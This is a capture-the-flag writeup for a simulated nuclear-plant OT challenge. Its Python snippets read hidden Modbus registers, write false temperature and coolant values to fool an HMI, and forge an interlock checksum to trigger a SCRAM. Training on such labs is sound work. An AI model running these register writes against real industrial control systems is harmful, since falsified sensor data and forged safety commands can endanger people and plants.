# Aït Baha Nuclear — Writeup

Three flags, two surfaces: a raw Modbus TCP PLC on `:5020` and a Flask HMI
on `:8012` that reads the PLC. Both are unauthenticated on purpose (this
is a legacy OT setup).

## Recon

Open the HMI. The control room displays 4 sensors:

- Core Temperature (°C)
- Coolant Flow (L/s)
- Neutron Flux
- Control Rod (%)

`/help` spells out the register map in full — read it. It lists holding
registers `HR 0..7` and mentions "HR 50+ reserved for plant diagnostics"
and "IR 100+ operator authentication code". Both are hints.

## F1 — medium  (enumerate hidden holding registers)

The HMI only shows `HR 0..3`, but the PLC has plenty more. Dump a wider
window:

```python
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient("HOST", port=5020); c.connect()
r = c.read_holding_registers(50, count=80)
print(bytes(v & 0xff for v in r.registers).split(b"\x00")[0].decode())
# INFODAYS{SaamNoLimits_the_silent_sensor_...}
```

Or with `modbus-cli` / `mbtget`:

```
mbtget -r3 -a 50 -n 80 HOST -p 5020
```

Each register holds one ASCII byte of the flag in its low byte.

## F2 — medium  (fool the sensors into a calibration envelope)

`/calibration` returns the flag **only** when:

- `temp ≤ 25.0 °C`  (HR 0 stores temp×10)
- `flow = 0 L/s`    (HR 1)
- `rod = 100 %`     (HR 3, already true by default)

The HMI reads straight from the PLC on every request, so a Modbus write
is enough to lie to it:

```python
c.write_register(0, 200)   # temp 20.0 °C
c.write_register(1, 0)     # coolant off
# then GET /calibration
```

No rollback, no signing, no sanity check. Classic SCADA gap.

## F3 — hard  (forge the SCRAM interlock checksum)

`/emergency` evaluates:

```
allow_scram := (HR4 == 1) AND (HR5 == interlock_checksum)

interlock_checksum =
    int( sha256(operator_code_ascii).hexdigest()[:4], 16 )
```

The trick: the operator code is **not** in holding registers. It's in
**input registers** (Modbus function code 4) at `IR 100..`. Players who
only ran `read_holding_registers` will find nothing.

```python
ir = c.read_input_registers(100, count=16)
op_code = bytes(v & 0xff for v in ir.registers).rstrip(b"\x00")
# op_code = b'RABAT_SAFE_42!!'

import hashlib
magic = int(hashlib.sha256(op_code).hexdigest()[:4], 16)

c.write_register(5, magic)   # HR 5 = operator_magic
c.write_register(4, 1)       # HR 4 = scram_flag
# then GET /emergency
```

Flag 3 is printed.

## Why each flag is the difficulty it is

- **F1** is an enumeration exercise — easy once you try any Modbus
  register scan, but blocked for players who only look at the HMI.
- **F2** is a TOCTOU-adjacent injection — teaches that an HMI that
  trusts its PLC is only as honest as its PLC.
- **F3** requires three distinct jumps: (a) switching from HR to IR
  (different Modbus function code), (b) computing a custom checksum
  from documented ASCII bytes, and (c) chaining a multi-write + HTTP
  trigger. Straight pymodbus scripting, no toolchain surprises — but
  genuinely multi-step.

## Hint ladder

1. *Free:* "Nothing on the HMI will give you all three. The PLC has
   more registers than the screen shows."
2. *Cheap:* "Read `/help`. All of it."
3. *Expensive:* "Holding registers and input registers are not the
   same address space. `fc=3` ≠ `fc=4`."
4. *Last resort:* "The interlock checksum is literally written out in
   `/help`. Copy it into your solver."
